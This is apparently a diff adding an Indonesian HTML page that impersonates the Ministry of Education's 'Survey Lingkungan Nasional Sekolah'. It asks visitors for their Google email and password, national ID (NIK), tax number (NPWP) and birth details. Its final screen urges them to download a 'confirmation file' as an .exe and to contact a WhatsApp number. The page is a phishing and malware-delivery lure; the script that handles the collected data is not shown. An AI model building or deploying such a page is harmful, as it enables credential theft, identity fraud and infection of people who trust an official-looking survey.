@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Survey Lingkungan Nasional Sekolah - Kemendikdasmen</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="logo-container">
+                <div class="logo">
+                    <i class="fas fa-graduation-cap"></i>
+                </div>
+                <div class="header-text">
+                    <h1>Kementerian Pendidikan, Kebudayaan, Riset, dan Teknologi</h1>
+                    <p>Survey Lingkungan Nasional Sekolah</p>
+                </div>
+            </div>
+        </div>
+    </header>
+    
+    <div class="container">
+        <!-- Step Indicator -->
+        <div class="step-indicator">
+            <div class="step completed">1</div>
+            <div class="step-line completed"></div>
+            <div class="step completed">2</div>
+            <div class="step-line completed"></div>
+            <div class="step completed">3</div>
+            <div class="step-line"></div>
+            <div class="step active">4</div>
+        </div>
+        
+        <!-- Login Page -->
+        <div id="login-page" class="card">
+            <div class="card-header">
+                <h2>Masuk ke Akun Anda</h2>
+                <p>Gunakan akun Google untuk mengisi survey</p>
+            </div>
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" placeholder="alamat.email@gmail.com">
+            </div>
+            <div class="form-group">
+                <label for="password">Kata Sandi</label>
+                <input type="password" id="password" placeholder="Masukkan kata sandi Anda">
+            </div>
+            <div class="form-group">
+                <button class="btn" id="login-btn">Selanjutnya</button>
+            </div>
+            <div class="social-login">
+                <p>Atau masuk dengan</p>
+                <div class="social-buttons">
+                    <div class="social-btn google" id="google-login">
+                        <i class="fab fa-google"></i>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Biodata Page -->
+        <div id="biodata-page" class="card hidden">
+            <div class="card-header">
+                <h2>Data Diri</h2>
+                <p>Lengkapi informasi biodata Anda</p>
+            </div>
+            <div class="form-group">
+                <label for="nik">NIK (Nomor Induk Kependudukan)</label>
+                <input type="text" id="nik" placeholder="Masukkan NIK Anda">
+                <span class="error-message" id="nik-error"></span>
+            </div>
+            <div class="form-group">
+                <label for="nama">Nama Lengkap</label>
+                <input type="text" id="nama" placeholder="Masukkan nama lengkap Anda">
+                <span class="error-message" id="nama-error"></span>
+            </div>
+            <div class="form-group">
+                <label for="tempat-lahir">Tempat Lahir</label>
+                <input type="text" id="tempat-lahir" placeholder="Masukkan tempat lahir Anda">
+                <span class="error-message" id="tempat-lahir-error"></span>
+            </div>
+            <div class="form-group">
+                <label for="tanggal-lahir">Tanggal Lahir</label>
+                <input type="date" id="tanggal-lahir">
+                <span class="error-message" id="tanggal-lahir-error"></span>
+            </div>
+            <div class="form-group">
+                <label for="instansi">Instansi Bertugas</label>
+                <input type="text" id="instansi" placeholder="Masukkan instansi tempat bertugas">
+                <span class="error-message" id="instansi-error"></span>
+            </div>
+            <div class="form-group">
+                <label for="npwp">NPWP (Nomor Pokok Wajib Pajak)</label>
+                <input type="text" id="npwp" placeholder="Masukkan NPWP Anda">
+                <span class="error-message" id="npwp-error"></span>
+            </div>
+            <div class="form-group">
+                <button class="btn" id="biodata-btn">Selanjutnya</button>
+            </div>
+        </div>
+        
+        <!-- Survey Page -->
+        <div id="survey-page" class="card hidden">
+            <div class="card-header">
+                <h2>Survey Lingkungan Sekolah</h2>
+                <p>Berikan penilaian Anda terhadap lingkungan sekolah</p>
+            </div>
+            
+            <div class="survey-question">
+                <h3>1. Bagaimana kondisi kebersihan lingkungan sekolah?</h3>
+                <div class="rating-scale">
+                    <div class="rating-option" data-value="1">Sangat Buruk</div>
+                    <div class="rating-option" data-value="2">Buruk</div>
+                    <div class="rating-option" data-value="3">Cukup</div>
+                    <div class="rating-option" data-value="4">Baik</div>
+                    <div class="rating-option" data-value="5">Sangat Baik</div>
+                </div>
+            </div>
+            
+            <div class="survey-question">
+                <h3>2. Seberapa memadai fasilitas sanitasi (toilet, wastafel) di sekolah?</h3>
+                <div class="rating-scale">
+                    <div class="rating-option" data-value="1">Sangat Tidak Memadai</div>
+                    <div class="rating-option" data-value="2">Tidak Memadai</div>
+                    <div class="rating-option" data-value="3">Cukup Memadai</div>
+                    <div class="rating-option" data-value="4">Memadai</div>
+                    <div class="rating-option" data-value="5">Sangat Memadai</div>
+                </div>
+            </div>
+            
+            <div class="survey-question">
+                <h3>3. Bagaimana kualitas udara di lingkungan sekolah?</h3>
+                <div class="rating-scale">
+                    <div class="rating-option" data-value="1">Sangat Buruk</div>
+                    <div class="rating-option" data-value="2">Buruk</div>
+                    <div class="rating-option" data-value="3">Cukup</div>
+                    <div class="rating-option" data-value="4">Baik</div>
+                    <div class="rating-option" data-value="5">Sangat Baik</div>
+                </div>
+            </div>
+            
+            <div class="survey-question">
+                <h3>4. Seberapa baik pengelolaan sampah di sekolah?</h3>
+                <div class="rating-scale">
+                    <div class="rating-option" data-value="1">Sangat Buruk</div>
+                    <div class="rating-option" data-value="2">Buruk</div>
+                    <div class="rating-option" data-value="3">Cukup</div>
+                    <div class="rating-option" data-value="4">Baik</div>
+                    <div class="rating-option" data-value="5">Sangat Baik</div>
+                </div>
+            </div>
+            
+            <div class="survey-question">
+                <h3>5. Bagaimana ketersediaan dan kondisi taman/ruang terbuka hijau?</h3>
+                <div class="rating-scale">
+                    <div class="rating-option" data-value="1">Sangat Buruk</div>
+                    <div class="rating-option" data-value="2">Buruk</div>
+                    <div class="rating-option" data-value="3">Cukup</div>
+                    <div class="rating-option" data-value="4">Baik</div>
+                    <div class="rating-option" data-value="5">Sangat Baik</div>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="saran">Saran dan Masukan untuk Lingkungan Sekolah</label>
+                <textarea id="saran" rows="4" placeholder="Tuliskan saran dan masukan Anda di sini..."></textarea>
+            </div>
+            
+            <div class="form-group">
+                <button class="btn" id="survey-btn">Kirim Survey</button>
+            </div>
+        </div>
+        
+        <!-- Success Page -->
+        <div id="success-page" class="card hidden">
+            <div class="success-message">
+                <div class="success-icon">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                <h2>Survey Berhasil Dikirim!</h2>
+                <p>Terima kasih telah berpartisipasi dalam Survey Lingkungan Nasional Sekolah.</p>
+                <p>Data Anda telah berhasil direkam dan disimpan.</p>
+                
+                <div class="download-section">
+                    <h3>Unduh File Konfirmasi</h3>
+                    <p>Klik tombol di bawah untuk mengunduh file konfirmasi partisipasi Anda.</p>
+                    <button class="btn btn-secondary" id="download-btn">
+                        <i class="fas fa-download"></i> Unduh File Konfirmasi (.exe)
+                    </button>
+                </div>
+                
+                <p class="whatsapp-info">Setelah mengunduh file, silakan hubungi kami melalui WhatsApp untuk langkah selanjutnya:</p>
+                <a href="https://wa.me/6281264656570?text=Halo,%20saya%20telah%20mengisi%20survey%20lingkungan%20sekolah%20dan%20ingin%20konfirmasi%20lebih%20lanjut." class="whatsapp-btn" target="_blank" id="whatsapp-link">
+                    <i class="fab fa-whatsapp"></i> Hubungi via WhatsApp
+                </a>
+            </div>
+        </div>
+    </div>
+    
+    <footer>
+        <div class="container">
+            <p>© 2023 Kementerian Pendidikan, Kebudayaan, Riset, dan Teknologi Republik Indonesia</p>
+            <p>Survey Lingkungan Nasional Sekolah</p>
+        </div>
+    </footer>
+
+    <script src="js/script.js"></script>
+</body>
+</html>
